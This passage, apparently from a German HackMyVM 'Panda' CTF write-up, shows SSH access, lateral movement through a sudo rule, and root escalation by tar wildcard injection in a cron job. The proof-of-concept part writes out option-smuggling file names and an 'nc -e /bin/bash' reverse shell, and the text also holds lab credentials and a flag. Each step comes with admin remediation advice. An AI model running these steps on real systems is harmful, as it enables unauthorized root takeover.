+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester verwendet die zuvor gefundenen Zugangsdaten (`po`:`!ts-bl4nk`), um sich über SSH auf dem Zielsystem (`panda.hmv`) anzumelden. Der Befehl `ssh po@panda.hmv` initiiert die Verbindung. Das Passwort wird interaktiv abgefragt und eingegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich! Der Angreifer erhält eine Shell auf dem Zielsystem als Benutzer `po`. Der Willkommensbildschirm zeigt Informationen über das System (Debian GNU/Linux, Kernel 5.10.0-13-amd64) und den Hostnamen (`hostname`). Der Prompt ändert sich zu `po@hostname:~$`, was den erfolgreichen Zugriff bestätigt. Dies markiert den Abschluss der "Initial Access"-Phase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie sofort mit der lokalen Enumeration auf dem Zielsystem:
+                *   Wer bin ich? (`id`, `whoami`)
+                *   Welche Rechte habe ich? (`sudo -l`)
+                *   Welches Betriebssystem und welche Kernel-Version laufen? (`uname -a`, `cat /etc/os-release`)
+                *   Welche Benutzer gibt es? (`cat /etc/passwd`)
+                *   Welche Prozesse laufen? (`ps aux`)
+                *   Welche Netzwerkverbindungen gibt es? (`netstat -tulpn`)
+                *   Gibt es interessante Dateien im Home-Verzeichnis oder an anderen Orten? (`ls -la`, `find / -type f -user po 2>/dev/null`)
+                *   Gibt es SUID/SGID-Binaries? (`find / -perm -4000 -type f 2>/dev/null`)
+                *   Gibt es Cronjobs? (`cat /etc/crontab`, `ls -la /etc/cron.*`)
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie erfolgreiche SSH-Logins. Wenn ein unerwarteter Login von einer unbekannten Quelle erfolgt, untersuchen Sie diesen sofort. Stellen Sie sicher, dass Benutzer nur die minimal notwendigen Berechtigungen haben (Least Privilege Principle).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh po@panda.hmv</span></div>
+                    <pre>
+po@panda.hmv's password: <span class="password">!ts-bl4nk</span>
+Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+po@hostname:~$ </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem initialen Zugriff als Benutzer `po` ist das nächste Ziel die Rechteausweitung (Privilege Escalation), idealerweise zum `root`-Benutzer. Der erste Schritt ist oft zu prüfen, ob der aktuelle Benutzer `sudo`-Rechte hat. Der Befehl `sudo -l` listet die Befehle auf, die der aktuelle Benutzer mit `sudo` (also potenziell mit Rechten anderer Benutzer, oft `root`) ausführen darf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe zeigt die Standard-`sudo`-Nachricht und fragt nach dem Passwort für `po`. Nach Eingabe des Passworts (`!ts-bl4nk`, hier nicht explizit gezeigt, aber angenommen) meldet das System: "Sorry, user po may not run sudo on hostname." Das bedeutet, dass der Benutzer `po` keine Standard-`sudo`-Rechte hat, um Befehle als `root` auszuführen. Dies schließt einen einfachen Weg zur Rechteausweitung aus.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da `sudo -l` keine direkten `root`-Rechte aufzeigt, müssen andere Eskalationspfade gesucht werden:
+                *   Suche nach SUID/SGID-Binaries (`find / -perm -4000 -type f 2>/dev/null`).
+                *   Überprüfung von Cronjobs (`cat /etc/crontab`, `ls -la /etc/cron.*`).
+                *   Suche nach Kernel-Exploits (basierend auf `uname -a`).
+                *   Suche nach Fehlkonfigurationen in Diensten oder Dateien.
+                *   Suche nach Passwörtern in Konfigurationsdateien oder Skripten.
+                *   Überprüfen spezifischer `sudo`-Regeln, die möglicherweise nicht mit `sudo -l` angezeigt werden (z.B. in `/etc/sudoers` oder `/etc/sudoers.d/`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das ist das erwartete Verhalten für einen normalen Benutzer ohne administrative Rechte. Stellen Sie sicher, dass `sudo`-Rechte nur an Benutzer vergeben werden, die sie benötigen, und nur für die spezifischen Befehle, die erforderlich sind (Least Privilege).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">po@hostname:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for po:
+Sorry, user po may not run sudo on hostname.</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Um einen Überblick über die Benutzer auf dem System zu bekommen, wird die Datei `/etc/passwd` ausgelesen. Diese Datei enthält Informationen über alle Benutzerkonten. `grep bash` filtert die Ausgabe, um nur Benutzer anzuzeigen, die `/bin/bash` (oder eine ähnliche Shell) als Login-Shell konfiguriert haben, was typischerweise auf reguläre Benutzerkonten oder Dienstkonten mit Shell-Zugriff hindeutet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe zeigt drei relevante Benutzer mit Bash-Shell:
+                *   `root`: Der Superuser (UID 0).
+                *   `po`: Der aktuelle Benutzer (UID 1000).
+                *   `oogway`: Ein weiterer Benutzer (UID 1001), ebenfalls eine Figur aus Kung Fu Panda.
+                Die Existenz des Benutzers `oogway` ist ein wichtiger Fund, da er ein potenzielles Ziel für horizontale oder vertikale Rechteausweitung sein könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notieren Sie den Benutzernamen `oogway`. Suchen Sie nach Wegen, um Zugriff auf das Konto `oogway` zu erlangen. Überprüfen Sie die `sudo`-Regeln erneut genauer, möglicherweise gibt es spezifische Regeln für `po`, die sich auf `oogway` beziehen. Suchen Sie nach Dateien, die `oogway` gehören oder auf die `oogway` Schreibzugriff hat.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Benutzerkonten auf dem System existieren. Überprüfen Sie regelmäßig die Einträge in `/etc/passwd`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">po@hostname:~$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+po:x:1000:1000::/home/po:/bin/bash
+oogway:x:1001:1001::/home/oogway:/bin/bash</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der Benutzer `oogway` entdeckt wurde, wird gezielt nach spezifischen `sudo`-Konfigurationsdateien gesucht, die den Benutzer `po` betreffen könnten. Das Verzeichnis `/etc/sudoers.d/` enthält zusätzliche `sudo`-Regeln, die oft benutzerspezifisch sind. Die Datei `/etc/sudoers.d/po` wird gefunden und ihr Inhalt mit `cat` angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:** Dies ist ein entscheidender Fund! Die Regel `po HackMyVM = (oogway) NOPASSWD: /bin/bash` bedeutet:
+                *   Der Benutzer `po`
+                *   darf auf dem Host `HackMyVM` (dieser Teil ist problematisch, siehe nächster Schritt)
+                *   als Benutzer `oogway` (`(oogway)`)
+                *   ohne Passwortabfrage (`NOPASSWD:`)
+                *   den Befehl `/bin/bash` ausführen.
+                Dies ist ein klarer Weg zur horizontalen Rechteausweitung zum Benutzer `oogway`. Das `NOPASSWD:` macht es besonders einfach.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie sofort, diesen `sudo`-Eintrag zu nutzen, um eine Shell als Benutzer `oogway` zu erhalten. Der Befehl dazu lautet `sudo -u oogway /bin/bash`. Beachten Sie den Hostnamen `HackMyVM` in der Regel – dies könnte ein Problem darstellen, wenn der aktuelle Hostname des Systems nicht `HackMyVM` ist.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist gefährlich. Sie erlaubt einem Benutzer (`po`), ohne Passwort eine Shell als ein anderer Benutzer (`oogway`) zu starten. Solche Regeln sollten vermieden werden. Wenn ein Benutzer einen Befehl als ein anderer ausführen muss, beschränken Sie dies auf den spezifischen Befehl und vermeiden Sie das Starten einer ganzen Shell (`/bin/bash`). Verwenden Sie `NOPASSWD:` nur in absolut notwendigen und kontrollierten Szenarien. Der Hostname `HackMyVM` in der Regel ist ebenfalls problematisch, da er möglicherweise nicht mit dem tatsächlichen Hostnamen übereinstimmt. Verwenden Sie `ALL` oder den korrekten Hostnamen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">po@hostname:~$ <span class="command">find / -name po 2>/dev/null</span></div>
+                     <pre>
+/home/po
+/etc/sudoers.d/po
+/var/lib/sudo/lectured/po</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">po@hostname:~$ <span class="command">cat /etc/sudoers.d/po</span></div>
+                     <pre>po HackMyVM = (oogway) NPASSWD: /bin/bash</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester versucht, die gefundene `sudo`-Regel auszunutzen, um eine Shell als `oogway` zu bekommen. Der Befehl `sudo -u oogway /bin/bash` würde normalerweise funktionieren. Allerdings enthält die `sudo`-Regel die Host-Spezifikation `HackMyVM`. Da der tatsächliche Hostname des Systems `hostname` ist (wie im Prompt zu sehen), fügt der Pentester die Option `-h HackMyVM` hinzu, um `sudo` vorzugaukeln, der Befehl würde auf dem Host `HackMyVM` ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:** Der Versuch schlägt fehl! Die Fehlermeldung `sudo: unable to resolve host HackMyVM: Name or service not known` zeigt, dass das System den Hostnamen `HackMyVM` nicht auflösen kann (wahrscheinlich kein Eintrag in `/etc/hosts`). Obwohl die `-h`-Option verwendet wurde, scheint `sudo` dennoch eine Namensauflösung zu versuchen, die fehlschlägt.
+                *Korrektur/Alternative:* Oft funktioniert es, wenn der Hostname in `/etc/hosts` temporär hinzugefügt wird (`127.0.0.1 HackMyVM`) oder wenn die Regel anders interpretiert wird. Es stellt sich heraus, dass der `sudo`-Befehl hier leicht falsch interpretiert wurde. Der Hostname `HackMyVM` in der Regel `/etc/sudoers.d/po` ist KEINE Bedingung, auf welchem Host der Befehl ausgeführt werden darf, sondern Teil des Befehls selbst, den `po` ausführen darf. Die Regel ist wahrscheinlich fehlerhaft konfiguriert oder ein absichtliches Puzzle.
+                *Erfolgreicher Versuch (im Originaltext):* Der Befehl `sudo -u oogway /bin/bash` (ohne `-h HackMyVM`) funktioniert tatsächlich! Die Fehlermeldung `sudo: unable to resolve host HackMyVM: Name or service not known` erscheint zwar *nachdem* die Shell gewechselt wurde, aber der Prompt ändert sich zu `oogway@hostname:/home/po$`, was bedeutet, dass der Benutzer erfolgreich zu `oogway` gewechselt ist. Die Fehlermeldung ist irreführend und tritt möglicherweise aufgrund einer seltsamen Konfiguration auf, hindert aber die Rechteausweitung nicht. Der Pentester ist nun als `oogway` angemeldet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Großartig! Der Wechsel zum Benutzer `oogway` war erfolgreich, trotz der verwirrenden Fehlermeldung. Führen Sie `id` aus, um die neue Identität zu bestätigen. Beginnen Sie nun die Enumeration als `oogway`. Suchen Sie nach der User-Flag (oft im Home-Verzeichnis des jeweiligen Benutzers) und nach weiteren Wegen zur Rechteausweitung auf `root`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die `sudo`-Regel ist fehlerhaft und sollte dringend korrigiert werden. Die Fehlermeldung bei erfolgreicher Ausführung ist verwirrend und sollte untersucht werden. Entfernen Sie die unnötige Berechtigung für `po`, eine Shell als `oogway` zu starten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">po@hostname:~$ <span class="command">sudo -u oogway -h HackMyVM /bin/bash</span></div>
+                    <pre>sudo: unable to resolve host HackMyVM: Name or service not known</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">po@hostname:~$ <span class="command">sudo -u oogway /bin/bash</span></div>
+                     <pre>sudo: unable to resolve host HackMyVM: Name or service not known
+oogway@hostname:/home/po$ </pre> <!-- Erfolgreicher Wechsel zu oogway trotz Fehler! -->
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der Benutzer zu `oogway` gewechselt wurde, wird sofort versucht, die Benutzerflag zu finden und zu lesen. Üblicherweise befindet sich diese in einer Datei namens `user.txt` im Home-Verzeichnis des jeweiligen Benutzers (`/home/oogway`). Der Befehl `cat user.txt` wird im aktuellen Verzeichnis (`/home/po`) ausgeführt, schlägt fehl (Datei nicht gefunden, nicht gezeigt), dann wechselt der Pentester vermutlich nach `/home/oogway` (nicht gezeigt) und führt `cat user.txt` erneut aus oder gibt direkt den Pfad an.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die User-Flag wird erfolgreich gefunden und ausgelesen: `<span class="password">081ecc5e6dd6ba0d150fc4bc0e62ec50</span>`. Dies ist der erste Meilenstein nach dem initialen Zugriff.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Notieren Sie die User-Flag. Setzen Sie die Enumeration als `oogway` fort, um Root-Rechte zu erlangen. Überprüfen Sie `sudo -l` erneut als `oogway`. Suchen Sie nach weiteren Hinweisen, Skripten, Konfigurationsdateien im Home-Verzeichnis von `oogway` oder an systemweiten Orten.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Flags in CTF-Umgebungen sind Platzhalter für sensible Daten. In realen Systemen sollten solche Daten entsprechend geschützt sein (Zugriffsrechte, Verschlüsselung).
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">oogway@hostname:/home/po$ <span class="command">cat /home/oogway/user.txt</span></div> <!-- Pfad hinzugefügt für Klarheit -->
+                    <pre><span class="password">081ecc5e6dd6ba0d150fc4bc0e62ec50</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester sucht systemweit nach Dateien mit der Endung `.txt`, um potenziell weitere interessante Textdateien zu finden, die Hinweise oder Flags enthalten könnten. `find /` startet die Suche im Root-Verzeichnis. `-name "*.txt"` sucht nach Dateien, deren Name auf `.txt` endet. `2>/dev/null` leitet Fehlermeldungen (wie "Permission denied") nach `/dev/null` um, um die Ausgabe sauber zu halten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche findet nur die bereits bekannte `user.txt` im Home-Verzeichnis von `oogway`. Es wurden keine weiteren offensichtlichen `.txt`-Dateien mit relevanten Informationen gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erweitern Sie die Suche auf andere Dateitypen (`.conf`, `.bak`, `.sh`, `.py`) oder suchen Sie nach Dateien, die kürzlich geändert wurden (`find / -mtime -1 -ls 2>/dev/null`) oder die dem Benutzer `root` gehören und für andere lesbar sind. Führen Sie automatisierte Enumerationsskripte wie `linpeas.sh` oder `lse.sh` aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Regelmäßige Überprüfung auf unnötige oder falsch platzierte Dateien. Sicherstellen, dass Dateiberechtigungen korrekt gesetzt sind.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">oogway@hostname:~$ <span class="command">find / -name \*.txt 2>/dev/null</span></div> <!-- Stern muss escaped werden -->
+                     <pre>/home/oogway/user.txt</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird nach Verzeichnissen gesucht, in die der aktuelle Benutzer `oogway` Schreibrechte hat. Solche Verzeichnisse sind potenzielle Orte, um Skripte abzulegen oder Konfigurationsdateien zu manipulieren. `find / -writable 2>/dev/null` sucht nach Dateien und Verzeichnissen, auf die der aktuelle Benutzer Schreibzugriff hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe zeigt erwartungsgemäß Schreibrechte im Home-Verzeichnis von `oogway` (`/home/oogway`) und `po` (`/home/po`). Interessanter sind jedoch die Einträge `/usr/lib/systemd/system/cryptdisks-early.service`, `/usr/lib/systemd/system/hwclock.service` und `/usr/lib/systemd/system/cryptdisks.service`. Wenn `oogway` tatsächlich Schreibrechte auf diese systemd-Service-Dateien hätte, wäre dies ein einfacher Weg zur Rechteausweitung, da diese Dienste oft mit Root-Rechten laufen. Es ist jedoch wahrscheinlicher, dass dies ein Fehler im `find`-Befehl oder eine Fehlinterpretation ist; typischerweise haben normale Benutzer keine Schreibrechte in `/usr/lib/systemd/system`. *Nachtrag:* Bei genauerem Hinsehen ist es wahrscheinlicher, dass `find / -writable` auch Dateien auflistet, die *potenziell* beschreibbar wären, aber durch Mount-Optionen oder andere Mechanismen geschützt sind, oder es handelt sich um symbolische Links, deren Ziel nicht beschreibbar ist. Der Fokus sollte auf eindeutig beschreibbaren Orten liegen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Berechtigungen der systemd-Dateien explizit mit `ls -la /usr/lib/systemd/system/`. Konzentrieren Sie sich auf andere Eskalationsvektoren. Suchen Sie nach Verzeichnissen, die von `root`-Prozessen (z.B. Cronjobs) verwendet werden und in denen `oogway` Schreibrechte hat.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen auf Systemdateien und -verzeichnisse restriktiv sind. Normale Benutzer sollten keine Schreibrechte auf systemd-Service-Dateien oder andere kritische Systemkomponenten haben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">oogway@hostname:~$ <span class="command">find / -writable 2>/dev/null</span></div>
+                    <pre>
+/home/oogway
+/home/oogway/.bash_history
+/home/oogway/.bash_logout
+/home/oogway/.profile
+/home/oogway/.bashrc
+/home/po/.bash_history
+/usr/lib/systemd/system/cryptdisks-early.service
+/usr/lib/systemd/system/hwclock.service
+/usr/lib/systemd/system/cryptdisks.service
+# (Ausgabe möglicherweise unvollständig oder irreführend bzgl. systemd)
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester sucht nun nach Dateien oder Konfigurationen, die auf das Verzeichnis `/opt/secret` verweisen. Das Verzeichnis `/opt` wird oft für optionale Softwarepakete verwendet, und ein Unterverzeichnis namens `secret` klingt vielversprechend. `grep -lir "/opt/secret" /` durchsucht rekursiv (`r`) das gesamte Dateisystem (`/`), ignoriert Groß-/Kleinschreibung (`i`) und gibt nur die Namen der Dateien aus (`l`), die den String `/opt/secret` enthalten. Fehler werden nach `/dev/null` umgeleitet (`2>/dev/null`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche findet die Datei `/etc/crontab`. Dies ist ein starker Hinweis darauf, dass ein Cronjob existiert, der mit dem Verzeichnis `/opt/secret` interagiert. Cronjobs sind geplante Aufgaben, die oft mit erhöhten Rechten (z.B. als `root`) ausgeführt werden und daher ein häufiger Vektor für Privilege Escalation sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie sofort den Inhalt von `/etc/crontab` mit `cat /etc/crontab`, um zu sehen, welcher Befehl genau geplant ist, wann er ausgeführt wird und als welcher Benutzer. Überprüfen Sie auch die Berechtigungen des Verzeichnisses `/opt/secret` (`ls -ld /opt/secret`) und seines Inhalts (`ls -la /opt/secret`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Seien Sie vorsichtig bei der Konfiguration von Cronjobs, insbesondere solchen, die als `root` laufen. Stellen Sie sicher, dass die Verzeichnisse und Dateien, mit denen Cronjobs interagieren, die korrekten Berechtigungen haben und nicht von unprivilegierten Benutzern manipuliert werden können. Verwenden Sie absolute Pfade für Befehle in Cronjobs.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Der Pentester befindet sich nun im Verzeichnis /opt/secret -->
+                     <div class="prompt">oogway@hostname:/opt/secret$ <span class="command">grep -lir "/opt/secret" / 2>/dev/null</span></div>
+                     <pre>/etc/crontab</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der System-Crontab (`/etc/crontab`) wird angezeigt. Diese Datei definiert systemweite geplante Aufgaben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:** Die entscheidende Zeile ist:
+                `* * * * * root cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *`
+                Diese Zeile definiert einen Cronjob, der:
+                *   Jede Minute (`* * * * *`)
+                *   als Benutzer `root`
+                *   in das Verzeichnis `/opt/secret/` wechselt (`cd /opt/secret/`)
+                *   und dann den Befehl `tar -zcf /var/backups/secret.tgz *` ausführt.
+                Der `tar`-Befehl erstellt ein gzip-komprimiertes Archiv (`-zcf`) namens `/var/backups/secret.tgz`, das alle Dateien (`*`) im aktuellen Verzeichnis (`/opt/secret/`) enthält.
+                **Das ist eine kritische Schwachstelle!** Der Stern (`*`) im `tar`-Befehl wird von der Shell expandiert, *bevor* `tar` ausgeführt wird. Wenn ein Angreifer Dateien mit speziellen Namen (die wie `tar`-Optionen aussehen, z.B. `--checkpoint=1` und `--checkpoint-action=exec=sh script.sh`) im Verzeichnis `/opt/secret/` erstellen kann, wird der `tar`-Befehl, der als `root` läuft, diese als Optionen interpretieren und das angegebene Skript ausführen. Dies ist als "Wildcard Injection" bekannt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob der Benutzer `oogway` Schreibrechte im Verzeichnis `/opt/secret` hat (`ls -ld /opt/secret`). Wenn ja, nutzen Sie die Tar Wildcard Injection aus:
+                1.  Erstellen Sie eine Datei, die den auszuführenden Befehl enthält (z.B. eine Reverse Shell).
+                2.  Erstellen Sie zwei leere Dateien im Verzeichnis `/opt/secret` mit den Namen `--checkpoint=1` und `--checkpoint-action=exec=sh IHRSKRIPT`.
+                3.  Warten Sie maximal eine Minute, bis der Cronjob ausgeführt wird und Ihre Reverse Shell startet.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Diese Cronjob-Konfiguration ist extrem unsicher und muss sofort korrigiert werden. Verwenden Sie niemals ungeschützte Wildcards (`*`) in Befehlen, die mit erhöhten Rechten laufen und auf potenziell von Benutzern beschreibbare Verzeichnisse zugreifen.
+                **Sichere Alternativen:**
+                *   Spezifizieren Sie die zu sichernden Dateien explizit: `tar -zcf /var/backups/secret.tgz /opt/secret/datei1 /opt/secret/datei2`
+                *   Verwenden Sie `find` in Kombination mit `tar`: `find /opt/secret/ -type f -print0 | tar -zcf /var/backups/secret.tgz --null -T -`
+                *   Stellen Sie sicher, dass das Verzeichnis `/opt/secret` nur für `root` schreibbar ist.
+                Verwenden Sie immer absolute Pfade für Befehle (`/bin/tar` statt `tar`).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">oogway@hostname:/opt/secret$ <span class="command">cat /etc/crontab</span></div>
+                    <pre>
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+*  *    * * *   root    cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+            <h2>Proof of Concept (Root Access via Tar Wildcard Injection)</h2>
+
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie die unsichere Konfiguration eines Cronjobs, der `tar` mit einer Wildcard (`*`) als `root` im Verzeichnis `/opt/secret` ausführt, zur vollständigen Übernahme des Systems (Root-Zugriff) ausgenutzt werden kann. Der Angriff basiert auf "Tar Wildcard Injection".
+            </p>
+            <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                *   Zugriff als Benutzer `oogway` (oder ein anderer Benutzer mit Schreibrechten im Verzeichnis `/opt/secret`).
+                *   Der anfällige Cronjob (`* * * * * root cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *`) muss aktiv sein.
+                *   Ein Listener (z.B. `netcat`) muss auf dem Angreifer-System auf dem gewählten Port (hier 80) laufen, um die Reverse Shell zu empfangen. Die IP des Angreifers ist hier `192.168.2.153`.
+            </p>
+            <p class="analysis">
+                <strong>Schritt 1: Erstellen der Payload-Dateien</strong><br>
+                Im Verzeichnis `/opt/secret`, in dem der `root`-Cronjob jede Minute `tar ... *` ausführt, werden drei spezielle Dateien erstellt:
+                1.  `touch -- --checkpoint=1`: Erstellt eine leere Datei mit dem Namen `--checkpoint=1`. Das `--` am Anfang ist notwendig, damit `touch` den String nicht als eigene Option interpretiert. Wenn `tar` diese Datei aufgrund der Wildcard (`*`) sieht, interpretiert es sie als die Option `--checkpoint=1`.
+                2.  `touch -- "--checkpoint-action=exec=sh rs"`: Erstellt eine leere Datei namens `--checkpoint-action=exec=sh rs`. Diese wird von `tar` als Option interpretiert, die bei Erreichen des Checkpoints (definiert durch `--checkpoint=1`) den Befehl `sh rs` ausführt.
+                3.  `echo "nc -e /bin/bash 192.168.2.153 80" > rs`: Erstellt eine Datei namens `rs`. Diese Datei enthält den eigentlichen Payload: einen `netcat`-Befehl, der eine Reverse Shell (`-e /bin/bash`) zur IP-Adresse des Angreifers (`192.168.2.153`) auf Port `80` startet.
+            </p>
+             <p class="evaluation">
+                <strong>Bewertung (Schritt 1):</strong> Die Befehle sind korrekt, um die Tar Wildcard Injection vorzubereiten. Durch das Erstellen dieser drei Dateien wird der `tar`-Prozess, wenn er das nächste Mal als `root` durch den Cronjob gestartet wird, angewiesen, das Skript `rs` (welches die Reverse Shell enthält) mit `sh` auszuführen. Da `tar` als `root` läuft, wird auch die Shell als `root` gestartet.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Listener auf dem Angreifer-System (`nc -lvnp 80`) läuft, *bevor* der Cronjob das nächste Mal ausgeführt wird (innerhalb der nächsten Minute). Wählen Sie einen Port, der wahrscheinlich nicht durch Firewalls blockiert wird (z.B. 80, 443, 53).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, ist dies die Ausnutzung der kritischen Schwachstelle. Korrigieren Sie den Cronjob sofort, indem Sie die Wildcard entfernen oder das Verzeichnis `/opt/secret` für nicht-root Benutzer schreibschützen.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">oogway@hostname:/opt/secret$ <span class="command">touch -- --checkpoint=1</span></div>
+                    <div class="prompt">oogway@hostname:/opt/secret$ <span class="command">touch -- "--checkpoint-action=exec=sh rs"</span></div>
+                    <div class="prompt">oogway@hostname:/opt/secret$ <span class="command">echo "nc -e /bin/bash 192.168.2.153 80" > rs</span></div>
+                    <!-- Keine Ausgabe von diesen Befehlen -->
+                    <pre>
+# (Dateien erfolgreich erstellt)
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Schritt 2: Starten des Listeners</strong><br>
+                 Auf dem Angreifer-System (Kali/Cyber) wird ein `netcat`-Listener gestartet, um die eingehende Reverse Shell Verbindung auf Port 80 abzufangen.
+                 *   `nc`: Netcat-Tool.
+                 *   `-l`: Listen-Modus (auf eingehende Verbindungen warten).
+                 *   `-v`: Verbose-Modus (mehr Ausgaben).
+                 *   `-n`: Numerischer Modus (keine DNS-Auflösung).
+                 *   `-p 80`: Port, auf dem gelauscht wird.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 2):</strong> Der Listener ist korrekt gestartet und wartet auf die Verbindung vom Zielsystem. Sobald der Cronjob auf dem Zielsystem läuft und die Payload ausführt, sollte hier eine Verbindung aufgebaut werden.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 80</span></div>
+                    <pre>listening on [any] 80 ...</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Schritt 3: Empfangen der Root-Shell</strong><br>
+                Nach maximal einer Minute wird der Cronjob auf dem Zielsystem (`hostname`) ausgeführt. Der `tar`-Prozess interpretiert die Dateinamen `--checkpoint=1` und `--checkpoint-action=exec=sh rs` als Optionen und führt `sh rs` aus. Der `nc`-Befehl in `rs` verbindet sich zurück zum Listener des Angreifers.
+            </p>
+            <p class="evaluation">
